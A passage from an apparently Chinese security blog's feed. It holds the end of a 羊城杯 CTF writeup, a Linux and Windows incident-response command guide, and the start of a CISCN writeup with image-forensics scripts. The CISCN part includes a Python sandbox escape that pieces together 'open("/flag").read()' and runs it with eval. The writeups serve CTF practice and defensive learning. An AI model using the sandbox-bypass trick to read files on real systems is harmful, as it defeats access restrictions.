&gt;&gt;&gt;]++&lt;++[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+++&lt;+++[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+&lt;&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+&lt;&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+&lt;+++[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;][-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+++&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+&lt;&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+&lt;&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+&lt;+++[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;][-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+++&lt;+++[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+++&lt;+++[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+++&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]&lt;&lt;+++++++++[-&gt;+++++++++&lt;]&gt;++.&lt;+++++[-&gt;+++++&lt;]&gt;+++.+++..+++++++.&lt;+++++++++[-&gt;---------&lt;]&gt;--------.&lt;++++++++[-&gt;++++++++&lt;]&gt;++.&lt;++++[-&gt;++++&lt;]&gt;+++.-.&lt;+++++++++[-&gt;---------&lt;]&gt;---.&lt;+++++++++[-&gt;+++++++++&lt;]&gt;++++++++.&lt;+++[-&gt;---&lt;]&gt;-.++++++.---.&lt;+++++++++[-&gt;---------&lt;]&gt;-.&lt;++++++++[-&gt;++++++++&lt;]&gt;++++++.++++++.&lt;+++[-&gt;---&lt;]&gt;--.++++++.&lt;++++++++[-&gt;--------&lt;]&gt;-------.&lt;++++++++[-&gt;++++++++&lt;]&gt;+++++++++.&lt;+++[-&gt;+++&lt;]&gt;+.&lt;+++++++++[-&gt;---------&lt;]&gt;--.&lt;++++++++[-&gt;++++++++&lt;]&gt;++++++++++++++.+.+++++.&lt;+++++++++[-&gt;---------&lt;]&gt;---.&lt;++++++++[-&gt;++++++++&lt;]&gt;++++++++.---.&lt;+++[-&gt;+++&lt;]&gt;++++.&lt;+++[-&gt;---&lt;]&gt;----.&lt;+++++++[-&gt;-------&lt;]&gt;------.[-]&lt;</code></p><p>会输出<code>Sorry but your flag is not here.</code></p><p>真正的flag藏在内存中</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-misc-12.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h1&gt;&lt;h2 id=&quot;D0n’t-pl4y-g4m3&quot;&gt;&lt;a href=&quot;#D0n’t-pl4y-g4m3&quot; class=&quot;headerlink</summary>
      
    
    
    
    <category term="wp" scheme="https://www.dr0n.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.dr0n.top/tags/wp/"/>
    
    <category term="2023" scheme="https://www.dr0n.top/tags/2023/"/>
    
    <category term="羊城杯" scheme="https://www.dr0n.top/tags/%E7%BE%8A%E5%9F%8E%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>应急响应中的常用命令</title>
    <link href="https://www.dr0n.top/posts/4dcb61d1/"/>
    <id>https://www.dr0n.top/posts/4dcb61d1/</id>
    <published>2023-07-18T05:00:00.000Z</published>
    <updated>2024-02-29T08:47:27.909Z</updated>
    
    <content type="html"><![CDATA[<h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><p><strong>应急响应流程</strong></p><p>事件判断：判断是否是安全事件，何种安全事件，勒索、挖矿、断网、DDos等等</p><p>临时处置：给出客户临时处置建议，断网隔离，保护现场环境</p><p>信息收集分析：收集客户信息和中毒主机信息，包括样本，日志分析、进程分析、启动项分析</p><p>清理处置：直接杀掉进程，删除文件，打补丁，抑或是修复文件</p><p>产出报告：整理并输出完整的安全事件报告</p><h1 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h1><h2 id="重要文件和目录"><a href="#重要文件和目录" class="headerlink" title="重要文件和目录"></a>重要文件和目录</h2><table><thead><tr><th>文件名</th><th>说明</th></tr></thead><tbody><tr><td>&#x2F;etc&#x2F;passwd</td><td>用户信息文件</td></tr><tr><td>&#x2F;etc&#x2F;crontab</td><td>定时任务文件</td></tr><tr><td>&#x2F;etc&#x2F;anacrontab</td><td>异步定时任务</td></tr><tr><td>&#x2F;etc&#x2F;rc.d&#x2F;rc.local</td><td>开机启动项</td></tr><tr><td>&#x2F;etc&#x2F;hosts</td><td>本地IP地址域名解析文件</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;btmp</td><td>登录失败日志</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;wtmp</td><td>包含用户登录日志</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;utmp</td><td>当前登陆系统的用户信息</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;cron</td><td>定时任务执行日志</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;lastlog</td><td>所有用户最近登录信息</td></tr><tr><td>&#x2F;var&#x2F;log&#x2F;secure</td><td>验证，授权等日志</td></tr></tbody></table><table><thead><tr><th>目录</th><th>说明</th></tr></thead><tbody><tr><td>&#x2F;root&#x2F;.ssh</td><td>root用户ssh公钥和私钥</td></tr><tr><td>&#x2F;tmp</td><td>系统或用户临时文件的目录</td></tr><tr><td>&#x2F;etc&#x2F;init.d</td><td>开机启动项</td></tr><tr><td>&#x2F;var&#x2F;log</td><td>日志默认存放目录</td></tr></tbody></table><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>查看当前目录下所有文件并排序<br><code>ls -alt</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-1.png"></p><p>查看系统内存使用情况<br><code>free -h</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-2.png"></p><p>查看系统进程及子进程<br><code>ps auxf</code>、<code>top</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-3.png"><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-4.png"></p><p>查看网络连接<br><code>netstat -antpl</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-5.png"></p><p>根据pid使用<code>ls -alh /proc/pid</code>命令查看对应的可执行程序</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-6.png"></p><p>查询端口打开的文件<br><code>lsof -i:port</code></p><p>查询进程打开的文件<br><code>lsof -p pid</code></p><p>查询用户打开的文件<br><code>lsof -u root</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-7.png"></p><p>修改文件属性<br><code>chattr</code></p><p>显示文件属性<br><code>lsattr</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-8.png"></p><p>排查启动项<br><code>cat /etc/rc.local</code><br><code>ls -alt /etc/profile.d/*.sh</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-9.png"></p><p>查看所有用户的定时任务<br><code>cat /etc/passwd | cut -f 1 -d : | xargs -I &#123;&#125; crontab -l -u &#123;&#125;</code><br><code>ls -altr /var/spool/cron/*</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-10.png"></p><p>查看历史命令<br><code>history</code><br><code>cat ~/.bash_history</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-11.png"></p><p>校验软件包<br><code>rpm -Va</code><br><code>dpkg --verify</code></p><table><thead><tr><th>值</th><th>说明</th></tr></thead><tbody><tr><td>S</td><td>表示对应文件的大小不一致</td></tr><tr><td>M</td><td>表示对应文件权限和所有权不一样</td></tr><tr><td>5</td><td>表示对应文件的MD5不一致</td></tr><tr><td>D</td><td>表示文件的设备号和驱动程序不一致</td></tr><tr><td>L</td><td>表示文件的符号连接内容不一致</td></tr><tr><td>U</td><td>表示文件所有者不一致</td></tr><tr><td>G</td><td>表示文件群组不一致</td></tr><tr><td>T</td><td>表示文件的修改时间不一致</td></tr></tbody></table><blockquote><p>软件更新会导致大小或MD5不一致，同时出现SM5需要注意</p></blockquote><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-12.png"></p><p>查看文件（目录）详细信息<br><code>stat</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-13.png"></p><p>查找当前目录下，指定天数内修改的指定类型文件<br><code>find / -mtime 0 -name *.jsp</code></p><p>查找当前目录下，指定天数内新增的指定类型文件<br><code>find / -ctime 0 -name *.jsp</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-14.png"></p><p>比较文件差异<br><code>diff -c</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-15.png"></p><p>查找隐藏进程<br><code>ps -ef | awk &#39;&#123;print $2&#125;&#39; |sort -n |uniq &gt; ps.p</code><br><code>ls /proc |sort -n |uniq &gt; proc.p</code><br><code>diff ps.p proc.p</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-16.png"></p><p>查看用户登录历史记录<br><code>last</code></p><p>查看用户登录失败记录<br><code>lastb</code></p><p>查看用户最近一次登录信息<br><code>lastlog</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-17.png"></p><p>登录成功的IP<br><code>grep &quot;Accepted&quot; /var/log/secure | awk &#39;&#123;print $11&#125;&#39; |sort |uniq -c |sort -nr | more</code></p><p>定位有爆破行为的IP<br><code>grep &quot;Failed&quot; /var/log/secure | awk &#39;&#123;print $11&#125;&#39; |sort |uniq -c |sort -nr | more</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-18.png"></p><p>查找每个IP地址的失败登录次数：<br><code>awk &#39;/sshd.*Failed/ &#123;print $(NF-3)&#125;&#39; /var/log/secure | sort | uniq -c |sort -nr</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-19.png"></p><p>查找特定IP地址的失败登录：<br><code>grep &quot;sshd.*Failed.*from &lt;IP_ADDRESS&gt;&quot; /var/log/secure | awk &#39;&#123;print $1,$2,$3,$9,$11&#125;&#39;</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-20.png"></p><p>查找特定IP地址的成功登录：<br><code>grep &quot;sshd.*Accepted.*from &lt;IP_ADDRESS&gt;&quot; /var/log/secure | awk &#39;&#123;print $1,$2,$3,$9,$11&#125;&#39;</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-21.png"></p><h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">Linux日志类型大致可以分为三类，内核和系统日志，用户日志，应用日志<br><br>内核和系统日志：这种日志主要由syslog管理、根据其配置文件/etc/syslog.conf中的设置决定内核消息和各种系统程序信息记录到哪个位置<br>用户日志：用户日志主要记录系统用户登录或者退出的信息，包括用户名账号、登录时间、源IP等<br>应用日志：记录应用程序运行过程中的各种事件信息<br></code></pre></td></tr></table></figure><p>可以使用系统自带的awk，find，grep去分析前面提到的各种日志（建议使用busybox，以防命令被篡改）<br>也可以使用第三方的分析工具，比如LogForensics，星图等等</p><h2 id="应急工具"><a href="#应急工具" class="headerlink" title="应急工具"></a>应急工具</h2><p><strong>busybox</strong></p><p>集成了很多linux常用命令的工具集，当命令被劫持或篡改时使用</p><p>官网：<a href="https://busybox.net/">https://busybox.net/</a></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-22.png"></p><p><strong>unhide</strong></p><p>检测发现借助rootkit及其他技术隐藏的进程和TCP&#x2F;UDP端口的命令行工具</p><p><code>yum -y install unhide</code>安装或者在<a href="https://www.unhide-forensics.info/">官网下载</a></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-23.png"></p><p><strong>chkrootkit</strong></p><p>linux下检测rootkit的脚本</p><p>ubuntu系列安装命令：<code>apt install chkrootkit</code><br>centos系列：由于chkrootkit没有包含在官方的Centos源中，因此要采取手动编译的方法来安装，<a href="https://www.chkrootkit.org/">官网</a></p><p>直接运行后查找infected关键字即可</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-24.png"></p><p><strong>clamav</strong></p><p>检测木马、病毒、恶意软件和其他恶意威胁的开源防病毒引擎</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-25.png"></p><h1 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h1><h2 id="常用命令-1"><a href="#常用命令-1" class="headerlink" title="常用命令"></a>常用命令</h2><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>regedit</td><td>注册表</td></tr><tr><td>taskmgr</td><td>任务管理器</td></tr><tr><td>msconfig</td><td>系统配置</td></tr><tr><td>eventvwr</td><td>事件查看器</td></tr><tr><td>compmgmt.msc</td><td>计算机管理</td></tr><tr><td>gpedit.msc</td><td>本地组策略</td></tr><tr><td>taskschd.msc</td><td>计划任务</td></tr><tr><td>lusrmgr.msc</td><td>本地用户和组</td></tr></tbody></table><p>查看网络连接<br><code>netstat -ano</code></p><p>操作系统的详细配置信息<br><code>systeminfo</code></p><p>获取系统进程信息<br><code>wmic process</code></p><p>根据应用程序查找PID<br><code>wmic process where name=&quot;cmd.exe&quot; get processid,executablepath,name</code></p><p>根据PID查找应用程序<br><code>wmic process where processid=&quot;9096&quot; get executablepath,name</code></p><p>获取系统进程信息<br><code>tasklist</code></p><p>对于要查询特定dll的调用情况，可以使用<br><code>tasklist /d dll名称</code></p><p>计算样本MD5<br><code>certutil -hashfile %样本exe% md5</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;应急响应&quot;&gt;&lt;a href=&quot;#应急响应&quot; class=&quot;headerlink&quot; title=&quot;应急响应&quot;&gt;&lt;/a&gt;应急响应&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;应急响应流程&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;事件判断：判断是否是安全事件，何种安全事件，勒索、挖矿、断网、</summary>
      
    
    
    
    <category term="hw" scheme="https://www.dr0n.top/categories/hw/"/>
    
    
    <category term="hw" scheme="https://www.dr0n.top/tags/hw/"/>
    
    <category term="应急响应" scheme="https://www.dr0n.top/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>2023ciscn初赛wp</title>
    <link href="https://www.dr0n.top/posts/8bd8be28/"/>
    <id>https://www.dr0n.top/posts/8bd8be28/</id>
    <published>2023-05-27T09:00:00.000Z</published>
    <updated>2024-02-29T08:47:27.926Z</updated>
    
    <content type="html"><![CDATA[<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="签到卡"><a href="#签到卡" class="headerlink" title="签到卡"></a>签到卡</h2><p><code>print(open(&#39;/flag&#39;).read())</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-misc-%E7%AD%BE%E5%88%B0%E5%8D%A1.png"></p><h2 id="被加密的生产流量"><a href="#被加密的生产流量" class="headerlink" title="被加密的生产流量"></a>被加密的生产流量</h2><p>追踪tcp流，数据提取出来base32</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-misc-%E8%A2%AB%E5%8A%A0%E5%AF%86%E7%9A%84%E7%94%9F%E4%BA%A7%E6%B5%81%E9%87%8F-1.png"></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-misc-%E8%A2%AB%E5%8A%A0%E5%AF%86%E7%9A%84%E7%94%9F%E4%BA%A7%E6%B5%81%E9%87%8F-2.png"></p><h2 id="国粹"><a href="#国粹" class="headerlink" title="国粹"></a>国粹</h2><p>先分割<code>题目.png</code>中的小麻将到<code>output</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br>w=<span class="hljs-number">0</span><br>h=<span class="hljs-number">0</span><br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>a=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;题目.png&#x27;</span>)<br><br>w1,h1=a.size<br><span class="hljs-keyword">while</span> w&lt;w1:<br>    im=a.crop((w,h,w+<span class="hljs-number">53</span>,h+<span class="hljs-number">73</span>))<br>    im.save(os.path.join(<span class="hljs-string">&#x27;output&#x27;</span>,<span class="hljs-built_in">str</span>(w))+<span class="hljs-string">&#x27;.png&#x27;</span>)<br>    w+=<span class="hljs-number">53</span><br><br></code></pre></td></tr></table></figure><p>再将<code>a.png</code>和<code>k.png</code>中的小麻将去<code>output</code>找对应的索引值，分别作为纵坐标和横坐标画图得到<code>flag</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>a=cv2.imread(<span class="hljs-string">&quot;a.png&quot;</span>)<br>k=cv2.imread(<span class="hljs-string">&quot;k.png&quot;</span>)<br>w=<span class="hljs-built_in">len</span>(a[<span class="hljs-number">0</span>])<br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">import</span> os<br>path=<span class="hljs-string">&#x27;output/&#x27;</span><br>d=os.listdir(path)<br>d.remove(<span class="hljs-string">&quot;0.png&quot;</span>)<br>data=[[],[]]<br>Status=[<span class="hljs-literal">False</span>,<span class="hljs-literal">False</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">im1,im2,sind</span>):<br>    A=cv2.absdiff(im1,im2)<br>    <span class="hljs-keyword">if</span> np.count_nonzero(A) ==<span class="hljs-number">0</span> :<br>        Status[sind]=<span class="hljs-literal">True</span><br>        ind=<span class="hljs-built_in">int</span>(j.split(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">0</span>])<br>        <span class="hljs-keyword">if</span> ind!=<span class="hljs-number">0</span>:<br>            data[sind].append(ind//<span class="hljs-number">53</span>)<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">while</span> i&lt;w:<br>    ima=a[<span class="hljs-number">0</span>:<span class="hljs-number">73</span>,i:i+<span class="hljs-number">53</span>]<br>    imk=k[<span class="hljs-number">0</span>:<span class="hljs-number">73</span>,i:i+<span class="hljs-number">53</span>]<br>    Status=[<span class="hljs-literal">False</span>,<span class="hljs-literal">False</span>]<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> d:<br>        im2=cv2.imread(os.path.join(path,j))<br>        check(ima,im2,<span class="hljs-number">0</span>)<br>        check(imk,im2,<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> Status==[<span class="hljs-literal">True</span>,<span class="hljs-literal">True</span>]:<br>            <span class="hljs-keyword">break</span><br>    i+=<span class="hljs-number">53</span><br><br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>a=Image.new(<span class="hljs-string">&quot;1&quot;</span>,(<span class="hljs-number">42</span>,<span class="hljs-number">42</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(w//<span class="hljs-number">53</span>):<br>    a.putpixel((data[<span class="hljs-number">1</span>][i],data[<span class="hljs-number">0</span>][i]),<span class="hljs-number">255</span>)<br>a.save(<span class="hljs-string">&#x27;123.png&#x27;</span>)<br>a.show()<br></code></pre></td></tr></table></figure><h2 id="pyshell"><a href="#pyshell" class="headerlink" title="pyshell"></a>pyshell</h2><p>python 沙盒</p><p>利用<code>_</code>拼接字符串后<code>eval</code>执行，同时限制了7位字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python">Welcome to this python shell,<span class="hljs-keyword">try</span> to find the flag!<br>&gt;&gt;<span class="hljs-string">&#x27;open&#x27;</span><br><span class="hljs-string">&#x27;open&#x27;</span><br><br>&gt;&gt;_+<span class="hljs-string">&#x27;(&quot;/&#x27;</span><br><span class="hljs-string">&#x27;open(&quot;/&#x27;</span><br><br>&gt;&gt;_+<span class="hljs-string">&#x27;fl&#x27;</span><br><span class="hljs-string">&#x27;open(&quot;/fl&#x27;</span><br><br>&gt;&gt;_+<span class="hljs-string">&#x27;ag&#x27;</span><br><span class="hljs-string">&#x27;open(&quot;/flag&#x27;</span><br><br>&gt;&gt;_+<span class="hljs-string">&#x27;&quot;)&#x27;</span><br><span class="hljs-string">&#x27;open(&quot;/flag&quot;)&#x27;</span><br><br>&gt;&gt;_+<span class="hljs-string">&#x27;.&#x27;</span><br><span class="hljs-string">&#x27;open(&quot;/flag&quot;).&#x27;</span><br><br>&gt;&gt;_+<span class="hljs-string">&#x27;rea&#x27;</span><br><span class="hljs-string">&#x27;open(&quot;/flag&quot;).rea&#x27;</span><br><br>&gt;&gt;_+<span class="hljs-string">&#x27;d()&#x27;</span><br><span class="hljs-string">&#x27;open(&quot;/flag&quot;).read()&#x27;</span><br><br>&gt;&gt;<span class="hljs-built_in">eval</span>(_)<br><span class="hljs-string">&#x27;flag&#123;b8c3ead1-cdad-4ddb-bb81-9486888d426a&#125;\n&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="puzzle"><a href="#puzzle" class="headerlink" title="puzzle"></a>puzzle</h2><p>打开后有很多宽度不一样的小<code>bmp</code>文件，放进010里分析发现在冗余位多了一些数据</p><p>以<code>bfReserved1</code>表示图片左上角<code>x</code>坐标，<code>bfReserved2</code>表示图片左上角<code>y</code>坐标，<code>biXPelsPerMeter</code>表示图片右下角<code>x</code>坐标，<code>biYPelsPerMeter</code>表示图片右下角<code>y</code>坐标画图</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-misc-puzzle-1.png"></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-misc-puzzle-2.png"></p><p>画的时候注意<code>biHeight</code>，在<code>bmp</code>中该值是正数说明图像是倒向的即图像存储是由下到上；该值是负数说明图像是倒向的即图像存储是由上到下，所以遇到负数的图片需要反转一下在拼图</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>file_list = os.listdir(<span class="hljs-string">&#x27;tmp4&#x27;</span>)<br><br>img = Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>,(<span class="hljs-number">7200</span>,<span class="hljs-number">4000</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(file_list)):<br>    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;./tmp4/<span class="hljs-subst">&#123;file_list[i]&#125;</span>&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>    pic = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;./tmp4/<span class="hljs-subst">&#123;file_list[i]&#125;</span>&#x27;</span>)<br>    Res1 = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    Res2 = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">8</span>:<span class="hljs-number">10</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    Xpel = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">38</span>:<span class="hljs-number">42</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    Ypel = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">42</span>:<span class="hljs-number">46</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    If_rev = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">22</span>:<span class="hljs-number">26</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    <span class="hljs-keyword">if</span>(If_rev != <span class="hljs-number">100</span>):<br>        pic = pic.transpose(Image.FLIP_TOP_BOTTOM)<br>    img.paste(pic,(Res1,Res2,Xpel,Ypel))<br>img.save(<span class="hljs-string">&#x27;flag.png&#x27;</span>)<br></code></pre></td></tr></table></figure><p>拼完后的图跑<code>zsteg</code>，得到第一部分的flag：<code>flag&#123;f1R5T_part_1s_LSB_sTeG0_</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-misc-puzzle-3.png"></p><p>然后还是<code>biHeight</code>，高度-100的做0，100的做1，binary之后得到第二部分flag：<code>2nd_paRT_15_reVeRSe_bMp_</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 